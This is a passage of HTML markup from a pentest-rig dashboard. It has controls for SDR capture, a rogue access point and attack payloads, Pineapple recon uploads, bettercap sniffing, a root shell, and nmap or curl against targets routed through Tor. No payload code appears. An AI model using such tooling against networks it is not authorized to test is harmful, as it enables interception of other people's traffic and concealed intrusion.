      <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px">
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="ppSend('sysinfo')">sysinfo</button>
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="ppSend('radioinfo')">radioinfo</button>
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="ppSend('ls /CAPTURES')">captures</button>
        <button class="tool-btn" style="width:auto;margin:0;padding:4px 8px" onclick="ppSend('help')">help</button>
      </div>

      <div class="panel-title" style="margin-top:12px">HACKRF SDR — RECEIVE ONLY</div>
      <div style="font-size:.7em;color:var(--dim);line-height:1.5;margin-bottom:6px">
        Needs SDR mode. Transmitting stays on the PortaPack's own screen.
      </div>
      <div style="display:flex;gap:4px;align-items:center;margin-bottom:6px;font-size:.75em;color:var(--dim)">
        <input id="hrf-start" value="2400" class="winput" style="flex:none;width:62px">–
        <input id="hrf-stop" value="2500" class="winput" style="flex:none;width:62px">MHz
        <label style="margin-left:auto;white-space:nowrap"><input type="checkbox" id="hrf-amp"> AMP</label>
      </div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <button class="tool-btn" style="flex:1;margin:0" onclick="hrfSweep()">SWEEP</button>
        <button class="tool-btn" style="flex:1;margin:0" onclick="hrfLive()">▶ LIVE</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="hrfLiveStop()">■</button>
      </div>
      <div class="section-label">PRESETS</div>
      <button class="tool-btn" onclick="hrfPreset(1,6000)">🌐 Full range 1–6000 MHz</button>
      <button class="tool-btn" onclick="hrfPreset(2400,2500)">📶 2.4 GHz WiFi / BT</button>
      <button class="tool-btn" onclick="hrfPreset(5150,5900)">📡 5 GHz WiFi</button>
      <button class="tool-btn" onclick="hrfPreset(300,930)">🔑 Sub-GHz ISM 300–930</button>
      <button class="tool-btn" onclick="hrfPreset(600,1000)">📱 Cellular 600–1000</button>
      <div class="section-label">IQ CAPTURE</div>
      <div style="display:flex;gap:4px;align-items:center;margin-bottom:6px;font-size:.75em;color:var(--dim)">
        <input id="iq-freq" value="433.92" class="winput" style="flex:none;width:70px">MHz
        <input id="iq-secs" value="3" class="winput" style="flex:none;width:36px">s
        <select id="iq-rate" style="background:var(--card);border:1px solid var(--border);color:var(--sec);padding:3px;font-family:inherit;font-size:1em">
          <option value="2">2 Msps</option><option value="4">4 Msps</option>
          <option value="8">8 Msps</option><option value="10">10 Msps</option>
        </select>
      </div>
      <button class="tool-btn" onclick="hrfIQ()" data-tip="Record raw IQ (.cs8) with a
GPS-tagged .txt sidecar."><span class="icon">⏺</span>Record IQ → FILES</button>
      <div class="section-label">ISM DECODE (rtl_433)</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <select id="ism-freq" style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="433.92M">433.92 MHz</option><option value="315M">315 MHz</option>
          <option value="915M">915 MHz</option><option value="868M">868 MHz</option>
        </select>
        <button class="tool-btn" style="width:auto;margin:0" onclick="ismDecode()"><span class="icon">▶</span>30s</button>
      </div>
      <div style="font-size:.7em;color:var(--dim);line-height:1.5;margin-bottom:6px">
        Uses the HackRF in SDR mode, otherwise the RTL dongle.
      </div>

      <div class="panel-title" style="margin-top:12px">MDK GPS — OVER WIFI</div>
      <div id="mdk-gps" class="wbox">checking…</div>
      <div style="font-size:.7em;color:var(--dim);line-height:1.5">
        The MDK's ESP32-S3 joins <b>tunnel-rat</b> and sends NMEA to
        <b>192.168.50.1:10110</b> (UDP). gpsd merges it with any USB GPS, so the
        GPS panel, wardrive logger and Kismet all use it.
      </div>
    </div>

    <div class="tab-content" id="left-wifi">
      <div class="panel-title">ADAPTER</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:6px;line-height:1.5">
        Which WiFi adapter tools use. "Auto" picks the USB adapter automatically.
      </div>
      <select id="adapter-sel" onchange="setAdapter()"
        style="width:100%;margin-bottom:12px;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.78em">
        <option value="">Auto-detect</option>
      </select>

      <div class="panel-title">WIFI UPLINK</div>
      <div id="wifi-uplink" class="wbox">checking...</div>
      <div style="display:flex;gap:4px;margin-bottom:6px">
        <button class="tool-btn" style="margin:0;flex:1" onclick="wifiTest()">🧪 Test internet</button>
        <button class="tool-btn" style="margin:0;flex:1" onclick="wifiDisconnect()">⏏ Disconnect</button>
      </div>
      <div class="section-label">NETWORKS</div>
      <button class="tool-btn" onclick="wifiScan()"><span class="icon">🔍</span>Scan for networks</button>
      <div id="wifi-pw-row" style="display:none;margin-bottom:6px">
        <div id="wifi-pw-label" style="font-size:.72em;color:var(--dim);margin-bottom:4px"></div>
        <div style="display:flex;gap:4px">
          <input id="wifi-pw" type="password" placeholder="network password" class="winput" onkeydown="if(event.key==='Enter')wifiJoinPending()">
          <button class="tool-btn" style="margin:0;width:auto" onclick="wifiJoinPending()">JOIN</button>
        </div>
      </div>
      <div id="wifi-list" class="wlist"></div>
      <div id="wifi-msg" style="font-size:.72em;color:var(--dim);min-height:1.4em;margin-bottom:6px"></div>
      <div class="section-label">SAVED NETWORKS</div>
      <div id="wifi-saved" class="wlist"></div>
      <div class="section-label">TUNNEL-RAT AP</div>
      <div id="wifi-ap" class="wbox">—</div>
      <div style="display:flex;gap:4px;margin-bottom:6px">
        <input id="ap-pw" type="password" placeholder="new AP password (8+)" class="winput">
        <button class="tool-btn" style="margin:0;width:auto" onclick="apSetPassword()">SET</button>
      </div>
    </div>

    <div class="tab-content" id="left-pineapple">
      <div class="panel-title">ROGUE AP — authorized testing only</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:10px;line-height:1.5">
        Runs a separate AP on the USB adapter (192.168.60.1), apart from your
        real tunnel-rat AP. While it runs, the USB adapter can't be the internet
        uplink — use Ethernet, or run uplink-free for local capture.
        <b style="color:var(--red)">For your own network / devices you're authorized to test.</b>
      </div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <input id="rogue-ssid" placeholder="SSID (e.g. tunnel-rat-test)" value="tunnel-rat-test"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.8em">
        <input id="rogue-chan" placeholder="Ch" value="6" type="number" min="1" max="165"
          style="width:52px;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.8em">
      </div>
      <input id="rogue-pass" placeholder="Password (blank = open network)" type="text" autocomplete="off"
        style="width:100%;margin-bottom:8px;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.8em">
      <div class="actions" style="margin-bottom:8px">
        <button class="tool-btn" onclick="rogueStart()"><span class="icon">📡</span>Start Rogue AP</button>
        <button class="tool-btn" onclick="run('rogue-stop')"><span class="icon">⏹</span>Stop</button>
        <button class="tool-btn" onclick="run('rogue-status')"><span class="icon">📊</span>Status</button>
        <button class="tool-btn" onclick="run('rogue-clients')"><span class="icon">👥</span>Clients</button>
      </div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:14px;line-height:1.5">
        Set the SSID and channel above, then Start. Check your phone's WiFi list
        for the name you chose.
      </div>

      <div class="panel-title" style="margin-top:16px">PAYLOADS — authorized testing only</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:10px;line-height:1.5">
        Scripts that run against the rogue AP. Start the Rogue AP above first.
      </div>
      <button class="tool-btn" onclick="loadPayloads()"><span class="icon">🔄</span>Refresh list</button>
      <div id="payload-list" style="margin-top:10px;margin-bottom:16px"></div>

      <div class="panel-title">PINEAPPLE PAGER</div>
      <div id="pager-status" class="wbox">checking...</div>
      <button class="tool-btn" onclick="pagerRefresh()"><span class="icon">🔄</span>Refresh</button>
      <div class="section-label">RECON UPLOADS</div>
      <div id="pager-files" class="wlist"></div>
      <div class="section-label">HOOKUP</div>
      <div style="color:var(--dim);font-size:.72em;line-height:1.7">
        The Pager's recon payload POSTs its JSON to<br>
        <span style="color:var(--dim)">/api/remote/pineapple</span><br>
        with an X-API-Key header.<br>
        From the tunnel-rat AP: <span style="color:var(--dim)">http://192.168.50.1:8080</span>
      </div>
    </div>

    <div class="tab-content" id="left-stingray">
      <div class="panel-title">STINGRAY WATCH — Orbic + Rayhunter</div>
      <div id="sr-down" style="display:none;font-size:.74em;color:var(--xred);margin-bottom:8px;line-height:1.5"></div>
      <div id="sr-grid" style="display:grid;grid-template-columns:minmax(250px,320px) 1fr;gap:12px;align-items:start">
        <div>
          <div class="stat-row"><span class="stat-key">ORBIC</span><span class="stat-val" id="sr-orbic">—</span></div>
          <div class="stat-row"><span class="stat-key">RECORDING</span><span class="stat-val" id="sr-rec">—</span></div>
          <div class="stat-row"><span class="stat-key">GPS</span><span class="stat-val" id="sr-gps">—</span></div>
          <div class="stat-row"><span class="stat-key">INTERNET</span><span class="stat-val" id="sr-net">—</span></div>
          <div class="stat-row"><span class="stat-key">TOWER</span><span class="stat-val" id="sr-tower">—</span></div>
          <div id="sr-tower-note" style="font-size:.68em;color:var(--dim);margin:4px 0 10px;line-height:1.5"></div>
          <div class="actions" style="margin-bottom:6px">
            <button class="tool-btn" style="width:auto;margin:0" onclick="srCmd('start')"><span class="icon">▶</span>Start recording</button>
            <button class="tool-btn" style="width:auto;margin:0;border-color:#883300" onclick="srCmd('stop')"><span class="icon">⏹</span>Stop</button>
            <button class="tool-btn" style="width:auto;margin:0" onclick="srCmd('offload')"><span class="icon">⬇</span>Pull captures</button>
            <button class="tool-btn" style="width:auto;margin:0" onclick="srCmd('test')"><span class="icon">🔔</span>Test alert</button>
          </div>
          <div id="sr-msg" style="font-size:.7em;color:var(--sec);min-height:1.2em;margin-bottom:6px"></div>
          <div class="panel-title" style="margin-top:10px">RECENT ALERTS</div>
          <div id="sr-alerts" style="font-size:.74em;line-height:1.5"></div>
          <div style="font-size:.68em;color:var(--dim);margin-top:10px;line-height:1.5">
            Captures land in FILES under orbic/. Full-screen map:
            <a id="sr-maplink" target="_blank" rel="noopener" style="color:var(--sec)">open it in its own tab</a>.
          </div>
        </div>
        <iframe id="sr-map" title="Stingray Watch map"
          style="width:100%;height:calc(100vh - 230px);min-height:360px;border:1px solid var(--border);border-radius:3px;background:#0a100c"></iframe>
      </div>
    </div>

    <div class="tab-content" id="left-cli">
      <div class="panel-title">QUICK ACTIONS</div>
      <button class="tool-btn" onclick="run('myip')"><span class="icon">🌍</span>My IP</button>
      <button class="tool-btn" onclick="run('active-ports')"><span class="icon">🚪</span>Active Ports</button>
      <button class="tool-btn" onclick="run('arp-table')" data-tip="Show ARP cache — MAC to
IP mappings on the LAN"><span class="icon">📋</span>ARP Table</button>
      <button class="tool-btn" onclick="run('wifi-scan')"><span class="icon">📶</span>WiFi Scan</button>
      <button class="tool-btn" onclick="run('sys-info')"><span class="icon">ℹ</span>System Info</button>
    </div>

    <div class="tab-content" id="left-files">
      <div class="panel-title">FILES — this connection</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <input id="files-filter" placeholder="filter by name…" oninput="renderFileTree('files-list','current','files-filter','file-view')"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.78em">
        <button class="tool-btn" style="width:auto;margin:0" onclick="loadFiles()"><span class="icon">🔄</span></button>
      </div>
      <div style="display:flex;gap:6px;margin-bottom:8px">
        <select id="files-filter-type" onchange="renderFileTree('files-list','current','files-filter','file-view')"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="all">All types</option><option value="pcap">pcap</option>
          <option value="text">text/log</option><option value="binary">binary</option>
        </select>
        <select id="files-filter-sort" onchange="renderFileTree('files-list','current','files-filter','file-view')"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="new">Newest</option><option value="old">Oldest</option>
          <option value="big">Largest</option><option value="name">Name</option>
        </select>
      </div>
      <div id="files-list"></div>
      <div id="file-view" class="term" style="margin-top:10px;max-height:260px;overflow:auto;white-space:pre-wrap;word-break:break-word;font-size:.68em"></div>
    </div>

    <div class="tab-content" id="left-log">
      <div class="panel-title">LOGS — previous connections</div>
      <div style="display:flex;gap:6px;margin-bottom:6px">
        <input id="log-filter" placeholder="filter by name…" oninput="renderFileTree('log-list','previous','log-filter','log-view')"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:6px;border-radius:3px;font-family:inherit;font-size:.78em">
        <button class="tool-btn" style="width:auto;margin:0" onclick="loadLog()"><span class="icon">🔄</span></button>
        <button class="tool-btn" style="width:auto;margin:0;border-color:#772222" onclick="clearAllLogs()"><span class="icon">🗑</span>Clear all</button>
      </div>
      <div style="display:flex;gap:6px;margin-bottom:8px">
        <select id="log-filter-type" onchange="renderFileTree('log-list','previous','log-filter','log-view')"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="all">All types</option><option value="pcap">pcap</option>
          <option value="text">text/log</option><option value="binary">binary</option>
        </select>
        <select id="log-filter-sort" onchange="renderFileTree('log-list','previous','log-filter','log-view')"
          style="flex:1;background:var(--card);border:1px solid var(--border);color:var(--sec);padding:5px;border-radius:3px;font-family:inherit;font-size:.74em">
          <option value="new">Newest</option><option value="old">Oldest</option>
          <option value="big">Largest</option><option value="name">Name</option>
        </select>
      </div>
      <div id="log-list"></div>
      <div id="log-view" class="term" style="margin-top:10px;max-height:260px;overflow:auto;white-space:pre-wrap;word-break:break-word;font-size:.68em"></div>
    </div>

    <div class="tab-content" id="left-terminal">
      <div class="panel-title">TERMINAL — full shell</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:8px;line-height:1.5">
        A real persistent shell, like SSH. cd sticks, interactive tools work,
        Ctrl-C, tab-completion, top/nano — all of it. <b>Running as root.</b>
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px">
        <button class="tool-btn" style="width:auto;margin:0" onclick="termRestart()"><span class="icon">🔄</span>New Session</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="termFit()"><span class="icon">⛶</span>Fit</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="termZoom(-1)" aria-label="Smaller terminal text">A−</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="termZoom(1)" aria-label="Larger terminal text">A+</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="run('sys-services')"><span class="icon">📊</span>Services</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="run('sys-disk')"><span class="icon">💾</span>Disk</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="run('sys-temp')"><span class="icon">🌡</span>Temp</button>
        <button class="tool-btn" style="width:auto;margin:0" onclick="run('ps-list')"><span class="icon">📋</span>Running</button>
        <button class="tool-btn" style="width:auto;margin:0;border-color:#883300" onclick="run('ps-kill-tools')"><span class="icon">✖</span>Kill Tools</button>
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px">
        <button class="tool-btn" style="width:auto;margin:0;border-color:#885500" onclick="run('sys-reboot')"><span class="icon">♻</span>Reboot</button>
        <button class="tool-btn" style="width:auto;margin:0;border-color:#883300" onclick="run('sys-shutdown')"><span class="icon">⏻</span>Shutdown</button>
      </div>
      <div id="term-keys" class="term-keys" role="toolbar" aria-label="Terminal keys">
        <button data-k="ctrl" id="tk-ctrl" aria-pressed="false">Ctrl</button>
        <button data-k="alt" id="tk-alt" aria-pressed="false">Alt</button>
        <button data-k="esc">Esc</button>
        <button data-k="tab">Tab</button>
        <button data-k="left" aria-label="Left arrow">←</button>
        <button data-k="down" aria-label="Down arrow">↓</button>
        <button data-k="up" aria-label="Up arrow">↑</button>
        <button data-k="right" aria-label="Right arrow">→</button>
        <button data-k="|">|</button>
        <button data-k="~">~</button>
        <button data-k="/">/</button>
        <button data-k="-">-</button>
        <button data-k="home">Home</button>
        <button data-k="end">End</button>
        <button data-k="pgup">PgUp</button>
        <button data-k="pgdn">PgDn</button>
        <button data-k="ctrlc" class="warn" aria-label="Control C">^C</button>
        <button data-k="kbd" aria-label="Show or hide the keyboard">⌨</button>
      </div>
      <div id="xterm-host"></div>
    </div>

    <div class="tab-content" id="left-theme">
      <div class="panel-title">THEME</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:14px;line-height:1.5">
        Pick your own colors. Changes apply live and save on this device.
      </div>

      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
        <input type="color" id="c-accent" value="var(--red)" oninput="onColors()"
          style="width:52px;height:40px;border:1px solid var(--border);border-radius:4px;background:var(--card);cursor:pointer">
        <div>
          <div style="font-size:.85em;color:var(--red)">Primary / accent</div>
          <div style="font-size:.7em;color:var(--dim)">headings, buttons, highlights</div>
        </div>
      </div>

      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
        <input type="color" id="c-window" value="var(--card)" oninput="onColors()"
          style="width:52px;height:40px;border:1px solid var(--border);border-radius:4px;background:var(--card);cursor:pointer">
        <div>
          <div style="font-size:.85em;color:var(--red)">Secondary / window</div>
          <div style="font-size:.7em;color:var(--dim)">CLI window + secondary text</div>
        </div>
      </div>

      <div style="display:flex;align-items:center;gap:12px;margin-bottom:18px">
        <input type="color" id="c-bg" value="var(--bg)" oninput="onColors()"
          style="width:52px;height:40px;border:1px solid var(--border);border-radius:4px;background:var(--card);cursor:pointer">
        <div>
          <div style="font-size:.85em;color:var(--red)">Tabs + background</div>
          <div style="font-size:.7em;color:var(--dim)">tab bar + page background</div>
        </div>
      </div>

      <div style="font-size:.8em;color:var(--red);margin:6px 0 6px">QUICK PRESETS</div>
      <div class="actions" style="margin-bottom:14px">
        <button class="tool-btn" onclick="setColors('#ff2222','#ff6666','#ff2222','')">Red Team</button>
        <button class="tool-btn" onclick="setColors('#00ff66','#66ffaa','#00ff66','green')">Matrix</button>
        <button class="tool-btn" onclick="setColors('#3399ff','#88ccff','#3399ff','blue')">Blue Ops</button>
        <button class="tool-btn" onclick="setColors('#ffaa00','#ffcc66','#ffaa00','amber')">Amber</button>
        <button class="tool-btn" onclick="setColors('#cc66ff','#e0aaff','#cc66ff','purple')">Purple</button>
        <button class="tool-btn" onclick="setColors('#ffffff','#dddddd','#888888','mono')">White</button>
        <button class="tool-btn" onclick="setColors('#222222','#444444','#111111','mono')">Black</button>
      </div>
      <div style="font-size:.7em;color:var(--dim);margin-bottom:10px">Presets also swap the background art to match.</div>

      <button class="tool-btn" onclick="setColors('#ff2222','#ff6666','#ff2222','')"><span class="icon">↺</span>Reset to default</button>
    </div>

    <div class="tab-content" id="left-anon">
      <div class="panel-title">TOR — onion routing</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:12px;line-height:1.5">
        Routes traffic through the Tor network via a SOCKS proxy on
        127.0.0.1:9050. "New identity" gets a fresh exit node.
      </div>

      <div style="font-size:.8em;color:var(--red);margin:6px 0 6px">SERVICE</div>
      <div class="actions" style="margin-bottom:14px">
        <button class="tool-btn" onclick="run('tor-status')"><span class="icon">📊</span>Status</button>
        <button class="tool-btn" onclick="run('tor-start')"><span class="icon">▶</span>Start</button>
        <button class="tool-btn" onclick="run('tor-stop')"><span class="icon">⏹</span>Stop</button>
      </div>

      <div style="font-size:.8em;color:var(--red);margin:6px 0 6px">IDENTITY</div>
      <div class="actions" style="margin-bottom:14px">
        <button class="tool-btn" onclick="run('tor-ip')"><span class="icon">🧅</span>Show Tor exit IP</button>
        <button class="tool-btn" onclick="run('tor-newid')"><span class="icon">🔄</span>New identity</button>
        <button class="tool-btn" onclick="run('myip-real')"><span class="icon">⚠</span>Real IP (no Tor)</button>
      </div>

      <div style="font-size:.72em;color:var(--dim);line-height:1.5">
        "Show Tor exit IP" returns <code>{"IsTor":true,...}</code> when working —
        that confirms your traffic exits through Tor, not your real address.
      </div>

      <div class="panel-title" style="margin-top:16px">PROXYCHAINS — route tools through Tor</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:10px;line-height:1.5">
        Wraps a command so it exits through the Tor SOCKS proxy (127.0.0.1:9050).
        Install once: <code>apt install proxychains4</code>.
      </div>
      <div class="actions" style="margin-bottom:10px">
        <button class="tool-btn" onclick="run('pc-set-tor')"><span class="icon">🔗</span>Point at Tor</button>
        <button class="tool-btn" onclick="run('pc-config')"><span class="icon">📄</span>Show config</button>
        <button class="tool-btn" onclick="run('pc-check')"><span class="icon">✅</span>Test via Tor</button>
      </div>
      <div class="actions" style="margin-bottom:6px">
        <button class="tool-btn" onclick="run('pc-nmap')"><span class="icon">🌐</span>nmap &lt;target&gt; via Tor</button>
        <button class="tool-btn" onclick="run('pc-curl')"><span class="icon">⬇</span>curl &lt;target&gt; via Tor</button>
      </div>
      <div style="font-size:.72em;color:var(--dim);line-height:1.5">
        "Test via Tor" should return <code>{"IsTor":true,...}</code>. For the
        &lt;target&gt; buttons, replace TARGET in the CLI before pressing ENTER.
      </div>

      <div class="panel-title" style="margin-top:16px">PGP — local, offline crypto</div>
      <div style="font-size:.72em;color:var(--dim);margin-bottom:10px;line-height:1.5">
        Runs entirely in your browser. Keys and text never leave this page or
        touch the network.
      </div>

      <div style="font-size:.8em;color:var(--red);margin:6px 0 4px">1. GENERATE KEY PAIR</div>
      <input id="pgp-name" placeholder="Name (e.g. CyberChuck)"
        style="width:100%;margin-bottom:5px;background:var(--card);border:1px solid var(--border);color:#d66;padding:6px;border-radius:3px;font-family:inherit">
      <input id="pgp-email" placeholder="Email" type="email"
        style="width:100%;margin-bottom:5px;background:var(--card);border:1px solid var(--border);color:#d66;padding:6px;border-radius:3px;font-family:inherit">
      <select id="pgp-type"
        style="width:100%;margin-bottom:5px;background:var(--card);border:1px solid var(--border);color:#d66;padding:6px;border-radius:3px;font-family:inherit">
        <option value="ecc">ECC (Curve25519) — fast</option>
        <option value="rsa4096">RSA 4096 — slower, broader support</option>
      </select>
      <input id="pgp-pass" placeholder="Passphrase (protects private key)" type="password"
        style="width:100%;margin-bottom:6px;background:var(--card);border:1px solid var(--border);color:#d66;padding:6px;border-radius:3px;font-family:inherit">
      <button class="tool-btn" onclick="pgpGenerate()"><span class="icon">🔑</span>Generate</button>
      <div id="pgp-genstatus" style="font-size:.72em;color:var(--dim);margin-top:6px"></div>

      <div style="font-size:.8em;color:var(--red);margin:14px 0 4px">2. KEYS</div>
      <label style="font-size:.7em;color:var(--dim)">Public key (share this)</label>
      <textarea id="pgp-pub" class="term" style="width:100%;height:90px;margin-bottom:6px" placeholder="Public key appears here, or paste a recipient's"></textarea>
      <label style="font-size:.7em;color:var(--dim)">Private key (keep secret)</label>
      <textarea id="pgp-priv" class="term" style="width:100%;height:90px" placeholder="Your private key appears here"></textarea>

      <div style="font-size:.8em;color:var(--red);margin:14px 0 4px">3. ENCRYPT / DECRYPT</div>
      <textarea id="pgp-text" class="term" style="width:100%;height:110px" placeholder="Plaintext to encrypt, or PGP message to decrypt"></textarea>
      <div class="actions" style="margin-top:6px">
        <button class="tool-btn" onclick="pgpEncrypt()"><span class="icon">🔒</span>Encrypt</button>
        <button class="tool-btn" onclick="pgpDecrypt()"><span class="icon">🔓</span>Decrypt</button>
      </div>
      <div id="pgp-status" style="font-size:.72em;color:var(--dim);margin-top:6px"></div>
      <textarea id="pgp-out" class="term" style="width:100%;height:120px;margin-top:6px" placeholder="Result" readonly></textarea>
    </div>

  </div><!-- /left -->

  <!-- CENTER -->
  <div id="center">
    <div id="rat-zone">
      <!-- Live network data feed replaces SVG -->
      <div id="live-feed" style="width:100%;height:100%;font-family:monospace;font-size:.78em;display:flex;flex-direction:column">
        <!-- Live feed tabs -->
        <div style="display:flex;border-bottom:1px solid var(--border);background:#050000;flex-shrink:0">
          <button onclick="setLiveTab('network')" id="lt-network" style="flex:1;background:var(--ddim);border:none;border-right:1px solid var(--border);color:var(--red);padding:4px;font-family:monospace;font-size:.72em;cursor:pointer">📡 NETWORK</button>
          <button onclick="setLiveTab('capture')" id="lt-capture" style="flex:1;background:transparent;border:none;border-right:1px solid var(--border);color:var(--border);padding:4px;font-family:monospace;font-size:.72em;cursor:pointer">📦 CAPTURE</button>
          <button onclick="setLiveTab('pcaps')"   id="lt-pcaps"   style="flex:1;background:transparent;border:none;border-right:1px solid var(--border);color:var(--border);padding:4px;font-family:monospace;font-size:.72em;cursor:pointer">💾 PCAPS</button>
          <button onclick="setLiveTab('pineapple')" id="lt-pineapple" style="flex:1;background:transparent;border:none;color:var(--border);padding:4px;font-family:monospace;font-size:.72em;cursor:pointer">🍍 PAGER</button>
          <button onclick="setLiveTab('ppscreen')" id="lt-ppscreen" style="flex:1;background:transparent;border:none;border-left:1px solid var(--border);color:var(--border);padding:4px;font-family:monospace;font-size:.72em;cursor:pointer">📟 SCREEN</button>
          <button onclick="setLiveTab('spectrum')" id="lt-spectrum" style="flex:1;background:transparent;border:none;border-left:1px solid var(--border);color:var(--border);padding:4px;font-family:monospace;font-size:.72em;cursor:pointer">📈 SPECTRUM</button>
        </div>
        <!-- Network panel -->
        <div id="lp-network" style="flex:1;overflow-y:auto;padding:10px;display:grid;grid-template-columns:1fr 1fr;gap:10px">
          <div>
            <div style="color:var(--red);letter-spacing:.1em;margin-bottom:6px;font-size:.82em">CONNECTIONS</div>
            <div id="lf-connections" style="color:var(--dim);line-height:1.8">loading...</div>
          </div>
          <div>
            <div style="color:var(--red);letter-spacing:.1em;margin-bottom:6px;font-size:.82em">INTERFACES</div>
            <div id="lf-interfaces" style="color:var(--dim);line-height:1.8">loading...</div>
          </div>
          <div>
            <div style="color:var(--red);letter-spacing:.1em;margin-bottom:6px;font-size:.82em">ARP TABLE</div>
            <div id="lf-arp" style="color:var(--dim);line-height:1.8">loading...</div>
          </div>
          <div>
            <div style="color:var(--red);letter-spacing:.1em;margin-bottom:6px;font-size:.82em">GPS</div>
            <div id="lf-gps" style="color:var(--dim);line-height:1.8">loading...</div>
          </div>
        </div>
        <!-- Live capture panel -->
        <div id="lp-capture" style="flex:1;overflow:hidden;display:none;flex-direction:column">
          <div style="padding:8px;border-bottom:1px solid var(--border);display:flex;gap:6px;flex-wrap:wrap;flex-shrink:0">
            <select id="cap-mode" style="background:#0a0000;border:1px solid var(--border);color:#cc2222;font-family:monospace;font-size:.75em;padding:3px">
              <option value="tcpdump-v">tcpdump verbose</option>
              <option value="tcpdump">tcpdump + pcap</option>
              <option value="tshark">tshark all</option>
              <option value="tshark-http">tshark HTTP</option>
              <option value="tshark-dns">tshark DNS</option>
              <option value="arp-scan">ARP scan</option>
              <option value="netdiscover">Netdiscover</option>
              <option value="bettercap-sniff">Bettercap sniff</option>
            </select>
            <select id="cap-iface" style="background:#0a0000;border:1px solid var(--border);color:#cc2222;font-family:monospace;font-size:.75em;padding:3px">
              <option value="end0">end0 (Ethernet)</option>
              <option value="wlp1s0">wlp1s0 (AP)</option>
              <option value="wlx7cf17e188725">wlx (TP-Link)</option>
            </select>
            <input id="cap-filter" placeholder="filter e.g. port 80" style="flex:1;background:#0a0000;border:1px solid var(--border);color:#cc2222;font-family:monospace;font-size:.75em;padding:3px 6px;min-width:80px">
            <button onclick="startCapture()" style="background:var(--card);border:1px solid var(--dred);color:var(--red);padding:3px 10px;font-family:monospace;font-size:.75em;cursor:pointer">▶ START</button>
            <button onclick="stopCapture()" style="background:#0a0000;border:1px solid var(--dim);color:#cc2222;padding:3px 10px;font-family:monospace;font-size:.75em;cursor:pointer">■ STOP</button>
          </div>
          <div id="cap-output" style="flex:1;overflow-y:auto;padding:8px;font-family:monospace;font-size:.75em;color:#cc2222;line-height:1.6;background:#030000"></div>
        </div>
        <!-- PCAP files panel -->
        <div id="lp-pcaps" style="flex:1;overflow-y:auto;padding:10px;display:none">
          <div style="color:var(--red);letter-spacing:.1em;margin-bottom:8px;font-size:.82em">SAVED CAPTURES</div>
          <button onclick="loadPcapList()" style="background:#0a0000;border:1px solid var(--dim);color:#cc2222;padding:3px 8px;font-family:monospace;font-size:.75em;cursor:pointer;margin-bottom:8px">🔄 REFRESH</button>
          <div id="pcap-list" style="color:var(--dim);line-height:2"></div>
        </div>
        <!-- Pineapple Pager recon panel -->
        <div id="lp-pineapple" style="flex:1;overflow:auto;padding:10px;display:none;background:rgba(4,0,0,0.9)">
          <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
            <span id="pager-title" style="color:var(--red);letter-spacing:.1em;font-size:.82em">PAGER RECON</span>
            <span id="pager-summary" style="color:var(--border);font-size:.75em"></span>
            <input id="pager-filter" placeholder="filter by SSID or BSSID" oninput="pagerRender()" style="margin-left:auto;background:#0a0000;border:1px solid var(--border);color:#cc2222;font-family:monospace;font-size:.75em;padding:3px 6px">
          </div>
          <div id="pager-view" style="color:var(--dim)">Open the PINEAPPLE tab and pick an upload.</div>
        </div>
        <!-- PortaPack screen mirror (Mayhem mode) -->
        <div id="lp-ppscreen" style="flex:1;overflow:auto;padding:10px;display:none;flex-direction:column;align-items:center;gap:8px;background:rgba(3,0,0,0.92)">
          <div style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap">
            <span style="color:var(--red);letter-spacing:.1em;font-size:.82em">PORTAPACK SCREEN</span>
            <span id="pp-screen-info" style="color:var(--border);font-size:.75em"></span>
            <button id="pp-mirror-btn" onclick="ppMirror()" style="margin-left:auto;background:var(--card);border:1px solid var(--dred);color:var(--red);padding:3px 10px;font-family:monospace;font-size:.75em;cursor:pointer">▶ MIRROR</button>
          </div>
